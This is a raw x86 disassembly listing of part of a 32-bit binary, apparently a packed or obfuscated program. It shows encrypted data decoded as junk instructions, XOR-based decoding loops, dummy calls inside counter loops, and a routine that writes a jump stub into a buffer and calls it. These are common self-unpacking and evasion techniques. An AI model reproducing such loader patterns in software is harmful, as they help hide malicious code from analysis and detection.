  416acb:	push   ss
  416acc:	adc    al,0xe0
  416ace:	and    DWORD PTR [edx-0x4a],0xfffffff8
  416ad2:	add    ecx,DWORD PTR [ebp-0x75]
  416ad5:	inc    esi
  416ad6:	aas    
  416ad7:	stos   DWORD PTR es:[edi],eax
  416ad8:	mov    eax,0x502279e4
  416add:	daa    
  416ade:	add    DWORD PTR [esi],0xffffffc1
  416ae1:	test   al,0x8f
  416ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ae4:	pop    edi
  416ae5:	xchg   ch,dh
  416ae7:	inc    esi
  416ae8:	sahf   
  416ae9:	pop    ebx
  416aea:	dec    eax
  416aeb:	mov    cl,0x59
  416aed:	lods   eax,DWORD PTR ds:[esi]
  416aee:	sub    esi,0xc7b108d
  416af4:	stos   DWORD PTR es:[edi],eax
  416af5:	dec    edx
  416af6:	rcr    DWORD PTR [edi+0x17],cl
  416af9:	adc    edx,DWORD PTR [edx-0x75]
  416afc:	dec    ebp
  416afd:	sub    ecx,0xda69c0ce
  416b03:	and    al,0x98
  416b05:	and    BYTE PTR [esi],cl
  416b07:	mov    esi,0x85009d3c
  416b0c:	mov    al,ds:0xd4ce7f0f
  416b11:	mov    ds:0x76f8ce6e,eax
  416b16:	in     al,dx
  416b17:	mov    eax,ds:0xae3cf045
  416b1c:	inc    esp
  416b1d:	mov    edi,0x679a03e4
  416b22:	push   edx
  416b23:	push   es
  416b24:	pop    ds
  416b25:	in     eax,0xe1
  416b27:	pop    ecx
  416b28:	out    0x64,eax
  416b2a:	dec    edi
  416b2b:	jno    0x416abe
  416b2d:	pop    edx
  416b2e:	lods   eax,DWORD PTR ds:[esi]
  416b2f:	pop    ebp
  416b30:	mov    cl,0xfb
  416b32:	(bad)
  416b35:	add    al,0x2a
  416b37:	and    bh,BYTE PTR [ebx-0xfe75c62]
  416b3d:	mov    bh,0x33
  416b3f:	je     0x416ba0
  416b41:	pusha  
  416b42:	(bad)  
  416b43:	(bad)  
  416b44:	dec    esi
  416b45:	sbb    BYTE PTR ds:[ecx],dh
  416b48:	mov    ds:0x8539d6cb,al
  416b4d:	aam    0xec
  416b4f:	mov    dl,0x36
  416b51:	fs and al,0xce
  416b54:	or     eax,0x5d6ee64d
  416b59:	mov    ds:0x36b4edce,eax
  416b5e:	out    0x88,al
  416b60:	jl     0x416b7b
  416b62:	(bad)  
  416b63:	fld    QWORD PTR [edi]
  416b65:	call   0xef1f13ea
  416b6a:	dec    ebp
  416b6b:	adc    ebp,eax
  416b6d:	sbb    edx,ebx
  416b6f:	repz iret 
  416b71:	dec    esi
  416b72:	das    
  416b73:	mov    bl,0x98
  416b75:	loopne 0x416bf1
  416b77:	push   esi
  416b78:	(bad)  
  416b79:	mov    esi,0xf9826bbc
  416b7e:	mov    edi,0x1e6eb2af
  416b83:	mov    ebx,0x6c63987f
  416b88:	add    esp,DWORD PTR [esi+0x72]
  416b8b:	scas   eax,DWORD PTR es:[edi]
  416b8c:	push   eax
  416b8d:	popa   
  416b8e:	or     eax,0xe63f5eec
  416b93:	xor    eax,0x23d7dd41
  416b98:	rol    dl,1
  416b9a:	push   edx
  416b9b:	retf   0x4f3
  416b9e:	and    BYTE PTR [ecx+esi*4],cl
  416ba1:	clc    
  416ba2:	scas   eax,DWORD PTR es:[edi]
  416ba3:	ja     0x416b2e
  416ba5:	mov    ch,0x5f
  416ba7:	and    eax,0x7b3b6ddf
  416bac:	mov    dl,0xc2
  416bae:	mov    BYTE PTR [eax],dh
  416bb0:	nop
  416bb1:	sbb    esi,DWORD PTR [ebx-0x53f0e0df]
  416bb7:	fiadd  WORD PTR [esp+ebp*4-0x4082986d]
  416bbe:	sbb    BYTE PTR [eax+0x51],ch
  416bc1:	(bad)  
  416bc2:	int    0x92
  416bc4:	popf   
  416bc5:	and    edx,DWORD PTR [edi+0x29ebd4ac]
  416bcb:	loope  0x416bbd
  416bcd:	lea    edi,[ebx-0x7b]
  416bd0:	ror    BYTE PTR [edx],0x24
  416bd3:	xchg   edi,eax
  416bd4:	xor    DWORD PTR [eax-0x3c],edi
  416bd7:	scas   al,BYTE PTR es:[edi]
  416bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bd9:	pop    edx
  416bda:	jb     0x416ba4
  416bdc:	inc    ebx
  416bdd:	mov    edi,0x4b8395ff
  416be2:	mov    BYTE PTR [ebx],bh
  416be4:	lods   eax,DWORD PTR ds:[esi]
  416be5:	adc    DWORD PTR [ecx-0x4b],ebp
  416be8:	lods   eax,DWORD PTR fs:[esi]
  416bea:	lods   al,BYTE PTR ds:[esi]
  416beb:	repnz sar bl,cl
  416bee:	and    DWORD PTR [ebx+0x60e2df84],esp
  416bf4:	rcr    BYTE PTR [eax-0x6813afcf],cl
  416bfa:	inc    edx
  416bfb:	ins    DWORD PTR es:[edi],dx
  416bfc:	(bad)  
  416bfd:	jl     0x416c4f
  416bff:	jbe    0x416c38
  416c01:	mov    edi,0x58748a3e
  416c06:	add    esi,DWORD PTR [esi+0x8af276e]
  416c0c:	mov    dh,0xe0
  416c0e:	mov    ds,esp
  416c10:	mov    dl,BYTE PTR [ebp+0x2fe3149b]
  416c16:	xchg   esp,eax
  416c17:	cmc    
  416c18:	in     eax,0x50
  416c1a:	scas   al,BYTE PTR es:[edi]
  416c1b:	sub    esi,DWORD PTR [ebp+edx*1+0x79beb716]
  416c22:	inc    eax
  416c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c24:	xchg   edi,eax
  416c25:	nop
  416c26:	rcl    ebx,cl
  416c28:	push   es
  416c29:	test   eax,0xee039dfb
  416c2e:	sbb    BYTE PTR [edi],cl
  416c30:	in     al,dx
  416c31:	std    
  416c32:	fsubp  st(7),st
  416c34:	sbb    al,0xda
  416c36:	stc    
  416c37:	mov    esp,0x391d86c6
  416c3c:	and    BYTE PTR [esi+ebx*2-0x4fc7955a],bl
  416c43:	(bad)  
  416c44:	outs   dx,DWORD PTR ds:[esi]
  416c45:	stos   DWORD PTR es:[edi],eax
  416c46:	stc    
  416c47:	imul   edx,DWORD PTR [ecx+0xe],0xffffff83
  416c4b:	sbb    al,0x70
  416c4d:	das    
  416c4e:	push   ebx
  416c4f:	imul   esp,DWORD PTR [edx+0x284220d1],0x32
  416c56:	cmc    
  416c57:	jge    0x416c65
  416c59:	sti    
  416c5a:	popf   
  416c5b:	fwait
  416c5c:	aam    0xbf
  416c5e:	mov    dh,0xe
  416c60:	jle    0x416cb0
  416c62:	dec    eax
  416c63:	adc    eax,0xb6515884
  416c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c69:	rol    esp,1
  416c6b:	fsubr  DWORD PTR [eax]
  416c6d:	retf   0xe7e8
  416c70:	or     cl,dl
  416c72:	jg     0x416c00
  416c74:	loope  0x416c57
  416c76:	inc    esp
  416c77:	cmp    esp,esp
  416c79:	dec    eax
  416c7a:	push   0x2cd9a088
  416c7f:	leave  
  416c80:	xor    cl,BYTE PTR [ebp-0x4e03a380]
  416c86:	dec    ebp
  416c87:	mov    ds:0x64691b4c,al
  416c8c:	test   DWORD PTR [ebx],0xd4a57172
  416c92:	add    eax,0x26a71c04
  416c97:	fsub   QWORD PTR [ebp-0x25]
  416c9a:	mov    ebx,0x4d1ceb2e
  416c9f:	repnz imul edi,DWORD PTR [eax],0x4d1dba2c
  416ca6:	ds xchg DWORD PTR fs:[esp+ecx*1],ebp
  416cab:	and    eax,0xfb24b696
  416cb0:	adc    BYTE PTR [ecx-0x37],cl
  416cb3:	ficomp WORD PTR [ecx-0x7a]
  416cb6:	jmp    0x5acdd7df
  416cbb:	jge    0x416d21
  416cbd:	or     dl,BYTE PTR [edi]
  416cbf:	jne    0x416ca0
  416cc1:	lods   eax,DWORD PTR ds:[esi]
  416cc2:	mov    bh,0xc5
  416cc4:	iret   
  416cc5:	sub    al,0x32
  416cc7:	jg     0x416ccf
  416cc9:	loopne 0x416ca0
  416ccb:	mov    DWORD PTR [ecx-0x47],esp
  416cce:	loope  0x416d1a
  416cd0:	fmul   QWORD PTR [ebx-0x2fcc07a3]
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428ce1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af45
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428ced
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d41
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d55
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
